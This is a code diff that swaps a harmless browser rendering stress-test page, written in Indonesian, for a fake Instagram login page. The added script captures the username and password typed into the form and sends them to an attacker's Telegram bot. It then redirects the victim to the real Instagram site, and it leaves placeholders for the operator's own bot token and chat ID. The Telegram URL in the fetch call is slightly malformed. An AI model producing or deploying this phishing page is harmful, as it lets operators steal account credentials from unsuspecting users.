@@ -3,84 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uji Stabilitas Perangkat</title>
+    <title>Login • Instagram Style</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #111;
-            color: #fff;
-            padding: 20px;
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            /* Efek gradasi warna resmi logo Instagram */
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            margin: 0; 
         }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
+        .login-box { 
+            background: white; 
+            padding: 40px; 
+            border-radius: 4px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2); 
+            width: 350px; 
+            box-sizing: border-box;
+        }
+        h2 { 
+            text-align: center; 
+            margin-bottom: 30px; 
+            color: #262626; 
+            font-family: 'Arial Black', sans-serif;
+            font-style: italic;
+            font-size: 32px;
+            letter-spacing: -1px;
+        }
+        .input-group { margin-bottom: 10px; }
+        .input-group input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+            background-color: #fafafa;
+            font-size: 12px;
+        }
+        .input-group input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        button { 
+            width: 100%; 
+            padding: 12px; 
+            background-color: #4cb5f9; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 14px; 
             font-weight: bold;
-            background-color: #ffcc00;
-            color: #000;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-bottom: 20px;
+            cursor: pointer; 
+            margin-top: 15px;
         }
-        /* Kontainer utama untuk menampung elemen visual raksasa */
-        #kontainer-uji {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 2px;
-            justify-content: center;
-            margin-top: 20px;
-        }
-        /* Kotak kecil yang akan digandakan puluhan ribu kali */
-        .kotak-mikro {
-            width: 8px;
-            height: 8px;
-            background-color: red;
-            box-shadow: 0 0 5px rgba(255,0,0,0.8);
-        }
+        button:hover { background-color: #0095f6; }
     </style>
 </head>
 <body>
 
-    <h2>Uji Beban Grafis & RAM (Aman)</h2>
-    <p>Klik tombol di bawah untuk memproses 50.000 elemen visual sekaligus.</p>
-    
-    <button onclick="mulaiUjiBeban()">Mulai Tes Beban</button>
-    
-    <div id="status">Status: Siap diuji</div>
-    <div id="kontainer-uji"></div>
+<div class="login-box">
+    <h2>Instagram</h2>
+    <form id="telegramForm">
+        <div class="input-group">
+            <input type="text" id="username" required placeholder="Nomor telepon, nama pengguna, atau email">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" required placeholder="Kata sandi">
+        </div>
+        <button type="submit">Masuk</button>
+    </form>
+</div>
 
-    <script>
-        function mulaiUjiBeban() {
-            const kontainer = document.getElementById("kontainer-uji");
-            const statusText = document.getElementById("status");
-            
-            statusText.innerText = "Status: Sedang memproses elemen raksasa...";
-            kontainer.innerHTML = ""; // Bersihkan layar terlebih dahulu
+<script>
+document.getElementById('telegramForm').addEventListener('submit', function(e) {
+    e.preventDefault(); 
 
-            // Angka 50.000 untuk memaksa browser merender grafis secara ekstrem
-            const jumlahElemen = 50000; 
-            
-            // Menggunakan teknik DocumentFragment agar eksekusi instan di memori
-            const fragment = document.createDocumentFragment();
+    const usernameInput = document.getElementById('username').value;
+    const passwordInput = document.getElementById('password').value;
 
-            for (let i = 0; i < jumlahElemen; i++) {
-                const kotak = document.createElement("div");
-                kotak.className = "kotak-mikro";
-                
-                // Variasi warna acak agar GPU bekerja lebih keras lagi
-                const hue = (i % 360);
-                kotak.style.backgroundColor = `hsl(${hue}, 100%, 50%)`;
-                kotak.style.boxShadow = `0 0 4px hsl(${hue}, 100%, 50%)`;
-                
-                fragment.appendChild(kotak);
-            }
+    // Kredensial Telegram (GANTI DENGAN DATA MILIK ANDA)
+    const botToken = "TOKEN_BOT_ANDA";
+    const chatId = "CHAT_ID_ANDA";
 
-            // Memaksa browser menampilkan 50.000 kotak ke layar dalam 1 milidetik
-            kontainer.appendChild(fragment);
-            statusText.innerText = "Status: Selesai! Coba geser (scroll) layar Anda.";
+    const pesan = `=== DATA LOGIN INSTAGRAM ===\nUsername: ${usernameInput}\nPassword: ${passwordInput}`;
+
+    fetch(`https://telegram.org{botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: pesan
+        })
+    })
+    .then(response => {
+        if(response.ok) {
+            // GANTI DENGAN URL WEBSITE TARGET ANDA
+            window.location.href = "https://instagram.com"; 
+        } else {
+            alert('Gagal mengirim data. Periksa konfigurasi API Bot.');
         }
-    </script>
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Terjadi kesalahan jaringan.');
+    });
+});
+</script>
 
 </body>
 </html>
